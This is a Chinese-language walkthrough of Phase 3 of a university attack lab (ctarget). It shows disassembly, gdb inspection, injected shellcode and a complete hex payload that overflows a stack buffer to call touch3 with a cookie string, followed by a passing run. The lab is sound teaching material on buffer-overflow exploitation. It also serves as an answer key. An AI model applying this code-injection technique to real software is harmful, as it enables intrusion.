# Phase 3

```log
000000000040197e <touch3>:
  40197e:       53                      push   %rbx
  40197f:       48 89 fb                mov    %rdi,%rbx
  401982:       c7 05 70 2b 20 00 03    movl   $0x3,0x202b70(%rip)        # 6044fc <vlevel>
  401989:       00 00 00 
  40198c:       48 89 fe                mov    %rdi,%rsi
  40198f:       8b 3d 6f 2b 20 00       mov    0x202b6f(%rip),%edi        # 604504 <cookie>
  401995:       e8 31 ff ff ff          callq  4018cb <hexmatch>
  40199a:       85 c0                   test   %eax,%eax
  40199c:       74 2d                   je     4019cb <touch3+0x4d>
  40199e:       48 89 da                mov    %rbx,%rdx
  4019a1:       48 8d 35 c8 18 00 00    lea    0x18c8(%rip),%rsi        # 403270 <_IO_stdin_used+0x380>
  4019a8:       bf 01 00 00 00          mov    $0x1,%edi
  4019ad:       b8 00 00 00 00          mov    $0x0,%eax
  4019b2:       e8 29 f4 ff ff          callq  400de0 <__printf_chk@plt>
  4019b7:       bf 03 00 00 00          mov    $0x3,%edi
  4019bc:       e8 72 03 00 00          callq  401d33 <validate>
  4019c1:       bf 00 00 00 00          mov    $0x0,%edi
  4019c6:       e8 65 f4 ff ff          callq  400e30 <exit@plt>
  4019cb:       48 89 da                mov    %rbx,%rdx
  4019ce:       48 8d 35 c3 18 00 00    lea    0x18c3(%rip),%rsi        # 403298 <_IO_stdin_used+0x3a8>
  4019d5:       bf 01 00 00 00          mov    $0x1,%edi
  4019da:       b8 00 00 00 00          mov    $0x0,%eax
  4019df:       e8 fc f3 ff ff          callq  400de0 <__printf_chk@plt>
  4019e4:       bf 03 00 00 00          mov    $0x3,%edi
  4019e9:       e8 15 04 00 00          callq  401e03 <fail>
  4019ee:       eb d1                   jmp    4019c1 <touch3+0x43>
```

与touch2一致,touch3也需要传入一个参数，但是其类型有所不同，然后会将cookie（数值类型）作为参数1，touch3的参数1作为参数2调用hexmatch。 使用IDA对hexmatch进行分析，可以得到以下伪代码：

```c
int __fastcall hexmatch(unsigned int val, char *sval)
{
    __int64 v2;          // rax
    const char *v3;      // r12
    int result;          // eax
    char cbuf[110];      // [rsp+0h] [rbp-98h]
    unsigned __int64 v6; // [rsp+78h] [rbp-20h]

    v6 = __readfsqword(0x28u);
    v2 = random();
    v3 = &cbuf[v2 - 100 * (((signed __int64)(v2 + ((unsigned __int128)(-6640827866535438581LL * (signed __int128)v2) >> 64)) >> 6) - (v2 >> 63))];
    __sprintf_chk(
        &cbuf[v2 - 100 * (((signed __int64)(v2 + ((unsigned __int128)(-6640827866535438581LL * (signed __int128)v2) >> 64)) >> 6) - (v2 >> 63))],
        1LL,
        -1LL,
        "%.8x",
        val);
    result = strncmp(sval, v3, 9uLL);
    LOBYTE(result) = result == 0;
    if (__readfsqword(0x28u) == v6)
        result = (unsigned __int8)result;
    return result;
}
```

可以得知，cookie是无符号整型，以及参数2为字符指针类型。

虽然无法理解hexmatch的处理过程，但是可以知道strncmp是根据输入以及运算结果v3进行比较，使用gdb对参数2进行输出可以得到以下结果：

```log
(gdb) x/s $rsi
0x5567e2ef:     "1fb6091a"
```

那么需要构造的内容显而易见了，需要将cookie转换为ASCII十六进制表示，由于参数2是字符指针类型，所以需要得到输入数据（比较部分）在内存中的位置。

使用gdb在getbuf过程中对rsp进行输出，便可以得到输入数据结尾位置。

```log
(gdb) p/x $rsp
$3 = 0x5567e330
```

为了避免数据被新的函数栈帧覆盖，所以需要将字符串数据写到返回地址之后，因此要对地址+8，得到0x5567e338。

得到以上信息后，便可以开始构造数据了，与touch2一致，通过gcc+objdump构造以下代码：

```log
movq $0x5567e338, %rdi
pushq $0x40197e
ret
```

可以得到以下结果。

```log
touch3.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 38 e3 67 55    mov    $0x5567e338,%rdi
   7:   68 7e 19 40 00          pushq  $0x40197e
   c:   c3                      retq   
```

基于以上信息，结合touch2所使用的方法，最终可以构造以下结果：

```log
48 c7 c7 38 e3 67 55 68 7e 19 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 f8 e2 67 55 00 00 00 00
31 66 62 36 30 39 31 61 00
```

运行之。

```log
hsojo@ubuntu:~/Downloads/target<stu_number>$ ./hex2raw -i touch3.txt |./ctarget -q
Cookie: 0x1fb6091a
Type string:Touch3!: You called touch3("1fb6091a")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
    user id <stu_number>
    course  15213-f15
    lab attacklab
    result  -259586058:PASS:0xffffffff:ctarget:3:48 C7 C7 38 E3 67 55 68 7E 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F8 E2 67 55 00 00 00 00 31 66 62 36 30 39 31 61 00 
hsojo@ubuntu:~/Downloads/target<stu_number>$ 
```
